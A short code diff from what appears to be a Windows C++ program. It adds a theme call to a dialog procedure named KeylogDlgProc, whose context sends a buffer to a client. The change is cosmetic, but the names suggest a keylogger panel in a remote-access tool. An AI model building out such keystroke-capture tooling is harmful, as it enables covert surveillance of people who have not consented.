@@ -73,7 +73,7 @@ INT_PTR CALLBACK KeylogDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
                 SendDataToClient(client, buffer.data(), (int)buffer.size());
             }
         }
-        
+        ApplyModernTheme(hDlg);
         return (INT_PTR)TRUE;
     }
     case WM_SIZE: {
